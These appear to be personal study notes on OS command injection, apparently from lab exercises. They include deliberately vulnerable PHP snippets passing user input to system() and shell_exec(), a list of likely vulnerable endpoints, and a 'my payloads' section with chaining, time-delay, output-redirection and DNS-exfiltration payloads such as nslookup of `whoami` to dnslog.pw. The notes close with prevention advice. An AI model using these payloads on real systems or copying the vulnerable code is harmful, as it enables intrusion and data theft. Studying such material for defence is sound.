@@ -1,0 +1,178 @@
+
+
+# what is OS command injection
+
+	│
+	├── Definition
+	│   ├── Vulnerability that allows execution of OS commands via user input
+	│   └── Exploitable when application passes input directly to system commands
+	    without proper sanitization
+	│
+	├── Impact
+	│   ├── Execution of arbitrary commands
+	│   ├── Read sensitive files (e.g., /etc/passwd, application configs)
+	│   ├── Modify or delete files
+	│   ├── System reconnaissance (whoami, uname -a, env)
+	│   └── Remote shell or full system compromise (RCE)
+	│
+	├── Techniques
+	│   ├── Command chaining
+	│   │   ├── ; command
+	│   │   ├── && command
+	│   │   └── | command
+	│   ├── Substitution / evaluation
+	│   │   ├── Backticks (`command`)
+	│   │   └── "$(command)"
+	│   ├── Blind injection
+	│   │   ├── Time-based (sleep 5)
+	│   │   └── OOB / DNS exfiltration (nslookup attacker.com)
+	│   ├── Encoding tricks
+	│   │   ├── URL encoding (%3B, %60)
+	│   │   └── Double encoding (%253B)
+	│   └── Environment & PATH abuse
+	│       ├── PATH poisoning
+	│       └── Exploit weak permissions on scripts or binaries
+	│
+	├── Common Obstacles
+	│   ├── Input filtering (removing ;, &, `, |)
+	│   ├── Limited shell / restricted environments
+	│   ├── Output not visible (blind injection)
+	│   └── Low privilege of application user
+	│
+	└── Prevention
+	    ├── Avoid passing user input directly to system commands
+	    ├── Use safe APIs / parameterized execution (execv, subprocess with args
+	        array)
+	    ├── Input validation (whitelist allowed values)
+	    ├── Escape/quote input properly if shell must be used
+	    ├── Run processes with least privilege
+	    └── Logging & monitoring for suspicious command usage
+
+
+
+   
+
+
+
+
+
+# source code
+
+	< ?php
+	// pdf-generator.php
+	
+	// accept POST only 
+	$what = $_POST['what'];  // type of  function 
+	$id   = $_POST['id'];    // for number only 
+	
+	// ===== Vulnerable part =====
+	// بيركب الـ input مباشرة في command system
+	$cmd = "/usr/bin/pdfgen --type " . $what . " --id " . $id;
+	
+	// تنفيذ الأمر على السيرفر
+	system($cmd);
+	?>
+
+	 ------------------------- OR ------------------
+	
+	<?php
+	// vulnerable.php
+	if (isset($_GET['host'])) {
+	    $host = $_GET['host'];
+	    // الخطر: تمرير مدخل المستخدم مباشرة للأمر
+	    $output = shell_exec("ping -c 4 " . $host);
+	    echo "<pre>$output</pre>";
+	}
+	?>
+
+ 
+
+
+
+# where to find OS Command Injection 
+
+
+	  ├─ Reporting / Export / External Commands
+	  │  ├─ /reports
+	  │  ├─ /export
+	  │  ├─ /generate
+	  │  ├─ /feedback
+	  │  ├─ /stockStatus
+	  │  ├─ /inventory
+	  │  ├─ /pdf
+	  │  └─ /convert
+	  ├─ CGI / Legacy Scripts
+	  │  ├─ /cgi-bin/ * 
+	  │  ├─ Perl scripts (.pl)
+	  │  ├─ PHP scripts (.php)
+	  │  └─ Old Python scripts (.py)
+	  ├─ File Handling / Media Endpoints
+	  │  ├─ upload endpoints
+	  │  ├─ convert / resize / thumbnail
+	  │  ├─ scan / antivirus processing
+	  │  └─ document converters (LibreOffice, ImageMagick)
+	  ├─ Admin / Maintenance / Diagnostic Pages
+	  │  ├─ log viewer
+	  │  ├─ healthcheck
+	  │  ├─ backup / restore
+	  │  ├─ sync tasks
+	  │  └─ run-task endpoints
+	  ├─ CI/CD Hooks / Deploy Scripts
+	  │  ├─ webhooks
+	  │  ├─ /hooks/ *
+	  │  ├─ deploy.sh
+	  │  └─ Jenkinsfile / pipelines
+	  ├─ Textual Parameters (Input Fields)
+	  │  ├─ URL parameters (query string)
+	  │  ├─ POST body (form, JSON, XML)
+	  │  ├─ HTTP headers (User-Agent, X-*)
+	  │  ├─ Cookies
+	  │  └─ Common names: cmd, script, path, id, productID, storeID, file,target
+	  ├─ Third-Party Plugins / Extensions
+	  │  └─ CMS plugins or libraries invoking external tools
+	  └─ File Management Endpoints
+	     ├─ download endpoints
+	     ├─ unzip / untar / tar / gzip
+	     └─ backup endpoints
+	
+
+
+
+
+
+
+
+# my payloads
+
+    A) the main vuln => POST /product/stock -`> ...&storeId=1|whoami
+ 
+ -  B)  **blind_OS_command_injection    
+ 
+    1- ==time_delays==:         POST /feedback/submit ->  & ping -c 10 172.0.0.1 &  (do encode  ) 
+		 can inject in (email,message)  'cause the code in server looks like ->
+		 **`mail -s "This site is great" -aFrom:abdo@normal-user.net feedback@vulnerable-website.com`**
+
+		 
+	2- ==output_redirection==:          we've 2 bugs (command inject, path traversal) 
+	  `i detect command inject (email,message) with "& ping -c 10 172.0.0.1 &"and it was work  so let's try if we can able to redirect the output of command in /var/www/images to read it  payload: "&whoami > /var/www/images/whoami.txt&" then go to read it  from end-point /images?filename=whoami.txt
+
+	
+	3-  ==out-of-band==: 
+		3.1:  must detect only with dns 'cause ping is block by waf of firewall so inject in email
+		like => email=abda@gmail.com+&+nslookup+sf.dnslog.pw #&message=test
+		
+		3.2: why 'll exfiltration data => 
+		email=+&+nslookup+`whoami`.sf.dnslog.pw+&  or replace it with  
+		$(whoami).sf.dnslog.pw
+
+# prevent
+
+          Prevention
+		    ├── Avoid passing user input directly to system commands
+		    ├── Use safe APIs / parameterized execution (execv, subprocess with 
+		       args array)
+		    ├── Input validation (whitelist allowed values)
+		    ├── Escape/quote input properly if shell must be used
+		    ├── Run processes with least privilege
+		    └── Logging & monitoring for suspicious command usage
+
